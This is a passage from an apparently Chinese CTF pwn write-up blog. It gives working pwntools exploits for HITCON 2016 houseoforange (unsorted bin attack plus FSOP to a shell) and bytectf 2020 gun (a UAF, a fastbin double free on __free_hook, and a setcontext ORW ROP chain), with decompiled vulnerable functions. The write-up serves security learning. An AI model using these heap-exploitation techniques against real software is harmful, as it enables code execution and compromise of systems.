class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc版本为2.23,利用unsorted bin attack打_IO_list_all,触发FSOP,触发错误abort调用_IO_flush_all_lockp刷新所有流执行IO_OVERFLOW,getshell</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./houseoforange_hitcon_2016&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./houseoforange_hitcon_2016&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DEBUG</span>():</span><br><span class="line">    attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice : &#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build</span>(<span class="params">length, name, price, color</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Length of name :&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(length).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Name :&#x27;</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Price of Orange:&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(price).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Color of Orange:&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(color).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">see</span>():</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upgrade</span>(<span class="params">length, name, price, color</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Length of name :&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(length).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Name:&#x27;</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Price of Orange: &#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(price).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Color of Orange: &#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(color).encode())</span><br><span class="line"></span><br><span class="line"><span class="comment">#由于程序中不存在free函数，因此利用堆溢出尝试free掉top chunk，注意更改size时要页对齐</span></span><br><span class="line">build(<span class="number">0x10</span>, <span class="string">b&#x27;A&#x27;</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">upgrade(<span class="number">0x1000</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p32(<span class="number">1</span>)+p32(<span class="number">0x1f</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0xfa1</span>), <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">build(<span class="number">0x1000</span>, <span class="string">b&#x27;A&#x27;</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"><span class="comment">#此时top chunk已经进入了unsorted bin</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露libc &amp; heapbase</span></span><br><span class="line">build(<span class="number">0x400</span>, <span class="string">b&#x27;A&#x27;</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">see()</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Name of house : &#x27;</span>)</span><br><span class="line">libcbase = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3c5141</span></span><br><span class="line">log.success(<span class="string">&#x27;libcbase ===&gt; &#x27;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line">_IO_list_all = libcbase + libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;_IO_list_all ===&gt; &#x27;</span>+<span class="built_in">hex</span>(_IO_list_all))</span><br><span class="line">sys = libcbase + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">upgrade(<span class="number">0x1000</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x10</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">see()</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heapbase = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0xc0</span></span><br><span class="line">log.success(<span class="string">&#x27;heapbase ===&gt; &#x27;</span>+<span class="built_in">hex</span>(heapbase))</span><br><span class="line"></span><br><span class="line"><span class="comment">#unsorted bin attack &amp; FSOP</span></span><br><span class="line">fake_fd = libcbase+<span class="number">0x3c4b78</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x400</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">fake_file = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x60</span>) + p64(<span class="number">0</span>) + p64(_IO_list_all-<span class="number">0x10</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xc0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += fake_file</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span> + p64(heapbase+<span class="number">0x5c8</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(sys)</span><br><span class="line"></span><br><span class="line">upgrade(<span class="number">0x1000</span>, payload, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#DEBUG()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h3 id="0x02-bytectf-2020-gun-UAF-fastbin-double-free-orw"><a href="#0x02-bytectf-2020-gun-UAF-fastbin-double-free-orw" class="headerlink" title="0x02.bytectf 2020 - gun( UAF+fastbin double-free+orw )"></a>0x02.bytectf 2020 - gun( UAF+fastbin double-free+orw )</h3><p><code>checksec</code>看到保护全开，seccomp-tools看到只能orw，程序为libc-2.31</p>
<p>IDA打开，分析程序逻辑，程序有三个功能buy，load，shoot。其中buy可以分配堆块</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">buy</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 index; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 size; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  index = JudgeEnough();                        <span class="comment">// 判断index</span></span><br><span class="line">  <span class="keyword">if</span> ( index &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Enough&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( Sign[<span class="number">3</span> * index] == <span class="number">1LL</span> )                 <span class="comment">// 只检测了sign</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;The bullet is Used!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Bullet price: &quot;</span>);</span><br><span class="line">  size = input();</span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">0xF</span> || (__int64)((__int64)off_4010 - size) &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Too pool!&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x500</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Too big!&quot;</span>);</span><br><span class="line">  *((_QWORD *)&amp;GunInfo + <span class="number">3</span> * index) = <span class="built_in">malloc</span>(size);</span><br><span class="line">  Sign[<span class="number">3</span> * index] = <span class="number">1LL</span>;                        <span class="comment">// 1：已拥有</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Bullet Name: &quot;</span>);</span><br><span class="line">  input_0(*((_QWORD *)&amp;GunInfo + <span class="number">3</span> * index), size);</span><br><span class="line">  off_4010 = (__int64 (__fastcall *)())((<span class="type">char</span> *)off_4010 - size);	<span class="comment">//off_4010初始值为0x1000</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Confirm&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中<code>off_4010</code>变量在我获得flag时刚好为0，出题人这么sao吗？？？</p>
<p>再看load函数</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_16E1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Which one do you want to load?&quot;</span>);</span><br><span class="line">  v1 = input();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0xD</span> || Sign[<span class="number">3</span> * v1] == <span class="number">0LL</span> || Sign[<span class="number">3</span> * v1] == <span class="number">2LL</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;what??&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( BulletInfo )</span><br><span class="line">    *((_QWORD *)&amp;GunInfo_AddOne + <span class="number">3</span> * v1) = BulletInfo;</span><br><span class="line">  BulletInfo = (__int64)&amp;GunInfo + <span class="number">24</span> * v1;</span><br><span class="line">  *((_QWORD *)&amp;GunInfo + <span class="number">3</span> * v1 + <span class="number">2</span>) = <span class="number">2LL</span>;     <span class="comment">// 2:装填状态</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Confirm.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>以及shoot函数</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_15F8</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  __int64 num; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !BulletInfo )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;No bullet!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Shoot time: &quot;</span>);</span><br><span class="line">  num = (<span class="type">unsigned</span> <span class="type">int</span>)input();                  <span class="comment">// shoot几次</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; BulletInfo &amp;&amp; i &lt; (<span class="type">int</span>)num; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Pwn! The %s bullet fired.\n&quot;</span>, *(<span class="type">const</span> <span class="type">char</span> **)BulletInfo);</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="type">void</span> **)BulletInfo);                 <span class="comment">// UAF，未清除装填位指针</span></span><br><span class="line">    v4 = BulletInfo;</span><br><span class="line">    BulletInfo = *(_QWORD *)(BulletInfo + <span class="number">8</span>);</span><br><span class="line">    *(_QWORD *)(v4 + <span class="number">16</span>) = <span class="number">0LL</span>;                 <span class="comment">// 0：已使用</span></span><br><span class="line">  &#125;</span><br><span class="line">  v1 = RestOfBullet();</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%lld bullets left\n&quot;</span>, v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在shoot函数中可以看到在free掉目标子弹后，未及时清除next位，导致产生UAF</p>
<p>利用流程大致如下：</p>
<ul>
<li>先利用UAF泄露libc</li>
<li>利用<code>fastbin double-free</code>打<code>__free_hook</code>为一个特殊的gadget，直接orw（在伪造过程中边调试边构造rop链）</li>
</ul>
<p>特殊gadget为<code>mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</code>，在这个gadget中，可以给rdx赋值，并且可以call一个函数，可以使能进入setcontext函数之后控制rsp</p>
<p>exp:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;x86_64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./gun&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./gun&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DEBUG</span>():</span><br><span class="line">    attach(io, <span class="string">&#x27;set resolve-heap-via-heuristic on&#x27;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Action&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shoot</span>(<span class="params">num</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Shoot time: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(num).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">num</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Which one do you want to load?&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(num).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">buy</span>(<span class="params">price, name</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Bullet price: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(price).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Bullet Name: &#x27;</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Your name: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;Static&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">gun共分为3个变量：</span></span><br><span class="line"><span class="string">分别是：chunk位</span></span><br><span class="line"><span class="string">        next_gun位</span></span><br><span class="line"><span class="string">        sign位（其中next_gun位在shoot后不会及时清0,因此会造成UAF）</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#共有13个位置</span></span><br><span class="line"><span class="comment">#填满tcache,并构造泄露libc</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    buy(<span class="number">0x80</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">    load(i)</span><br><span class="line">shoot(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">load(<span class="number">7</span>)</span><br><span class="line">load(<span class="number">6</span>)</span><br><span class="line">shoot(<span class="number">2</span>)        <span class="comment">#7 进入unsortedbin</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    buy(<span class="number">0x80</span>, <span class="string">b&#x27;A&#x27;</span>) <span class="comment">#0 1 2 3 4 5 6</span></span><br><span class="line">load(<span class="number">6</span>)</span><br><span class="line">shoot(<span class="number">2</span>)        <span class="comment">#由于6的next_gun位未清0,因此直接二连发泄露libc</span></span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Pwn! The &#x27;</span>)</span><br><span class="line">libcbase = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1ebbe0</span></span><br><span class="line">log.success(<span class="string">&#x27;libcbase ===&gt; &#x27;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line">__free_hook = libcbase+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;__free_hook ===&gt; &#x27;</span>+<span class="built_in">hex</span>(__free_hook))</span><br><span class="line">setcontext = libcbase+libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#修复unsorted bin然后fastbin double-free打__free_hook</span></span><br><span class="line">buy(<span class="number">0x80</span>, p64(libcbase+<span class="number">0x1ebbe0</span>)*<span class="number">2</span>) <span class="comment">#6</span></span><br><span class="line">load(<span class="number">6</span>)</span><br><span class="line">buy(<span class="number">0x60</span>, <span class="string">b&#x27;A&#x27;</span>) <span class="comment">#8</span></span><br><span class="line">load(<span class="number">7</span>)                 <span class="comment">#此时6 7均为0x60块,且6 7为同一堆块</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):      <span class="comment">#0 1 2 3 4 5为0x60</span></span><br><span class="line">    load(i)</span><br><span class="line">    shoot(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Pwn! The &#x27;</span>)</span><br><span class="line">heapbase = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x541</span></span><br><span class="line">log.success(<span class="string">&#x27;heapbase ===&gt; &#x27;</span>+<span class="built_in">hex</span>(heapbase))</span><br><span class="line">load(<span class="number">8</span>)</span><br><span class="line">shoot(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):      <span class="comment">#填满0x60的tcache, 0 1 2 3 4 5 8 9</span></span><br><span class="line">    buy(<span class="number">0x60</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    load(i)</span><br><span class="line">    shoot(<span class="number">1</span>)</span><br><span class="line">load(<span class="number">8</span>)</span><br><span class="line">shoot(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#fastbin double-free</span></span><br><span class="line">shoot(<span class="number">1</span>)</span><br><span class="line">load(<span class="number">9</span>)</span><br><span class="line">shoot(<span class="number">1</span>)</span><br><span class="line">shoot(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = libcbase+<span class="number">0x26b72</span></span><br><span class="line">pop_rsi = libcbase+<span class="number">0x27529</span></span><br><span class="line">pop_rdx_r12 = libcbase+<span class="number">0x11c1e1</span></span><br><span class="line">ret = pop_rdi+<span class="number">1</span></span><br><span class="line">open_ = libcbase+libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_ = libcbase+libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts = libcbase+libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_r12_r14 = libcbase+<span class="number">0x913b0</span></span><br><span class="line"><span class="comment">#mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]   0x1547a0</span></span><br><span class="line"><span class="comment">#修改fd</span></span><br><span class="line">flag = heapbase+<span class="number">0x2a0</span></span><br><span class="line">rop_chain_1 = p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(flag)+p64(pop_rdx_r12)+p64(<span class="number">0x50</span>)+p64(<span class="number">0</span>)+p64(read_)+p64(pop_rdi)+p64(flag)+p64(ret)+p64(pop_r12_r14)</span><br><span class="line">rop_chain_2 = p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rdx_r12)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(open_)+p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(flag)+p64(ret)+p64(pop_r12_r14)</span><br><span class="line">rop_chain_3 = p64(pop_rdx_r12)+p64(<span class="number">0x50</span>)+p64(<span class="number">0</span>)+p64(read_)+p64(pop_rdi)+p64(flag)+p64(puts)</span><br><span class="line">rsp = heapbase+<span class="number">0x7a0</span></span><br><span class="line">rcx = ret</span><br><span class="line">buy(<span class="number">0x60</span>, <span class="string">b&#x27;B&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">load(<span class="number">0</span>)</span><br><span class="line">buy(<span class="number">0x60</span>, <span class="string">b&#x27;C&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">load(<span class="number">1</span>)</span><br><span class="line">buy(<span class="number">0x60</span>, <span class="string">b&#x27;D&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">load(<span class="number">2</span>)</span><br><span class="line">buy(<span class="number">0x60</span>, rop_chain_3)</span><br><span class="line">load(<span class="number">3</span>)</span><br><span class="line">buy(<span class="number">0x60</span>, rop_chain_2)</span><br><span class="line">load(<span class="number">4</span>)</span><br><span class="line">buy(<span class="number">0x60</span>, rop_chain_1)</span><br><span class="line">load(<span class="number">5</span>)</span><br><span class="line">buy(<span class="number">0x60</span>, <span class="string">b&#x27;H&#x27;</span>*<span class="number">0x28</span>+p64(rsp)+p64(rcx))</span><br><span class="line">load(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">buy(<span class="number">0x60</span>, p64(__free_hook)) <span class="comment">#7</span></span><br><span class="line"></span><br><span class="line">content = <span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>+p64(heapbase+<span class="number">0x6b8</span>)+<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>+p64(setcontext)</span><br><span class="line">buy(<span class="number">0x60</span>, <span class="string">b&#x27;C&#x27;</span>*<span class="number">8</span>) <span class="comment">#8</span></span><br><span class="line">buy(<span class="number">0x60</span>, content) <span class="comment">#9</span></span><br><span class="line">buy(<span class="number">0x60</span>, p64(libcbase+<span class="number">0x1547a0</span>))   <span class="comment">#10     此时剩余可分配大小已被分配完</span></span><br><span class="line"></span><br><span class="line">load(<span class="number">9</span>)</span><br><span class="line">shoot(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">io.send(<span class="string">b&#x27;./flag\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#DEBUG()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h3 id="0x03-minilctf-easytcache-safe-linking绕过-tcache-struct劫持-ROP"><a href="#0x03-minilctf-easytcache-safe-linking绕过-tcache-struct劫持-ROP" class="headerlink" title="0x03.minilctf - easytcache( safe-linking绕过+tcache_struct劫持+ROP )"></a>0x03.minilctf - easytcache( safe-linking绕过+tcache_struct劫持+ROP )</h3><p><code>checksec</code>看到保护全开，seccomp-tools看到只能orw，程序为libc-2.33</p>
<p>IDA打开看到是个c++程序，一个菜单题，可以add 5次，free 3次，注意delete函数中</p>
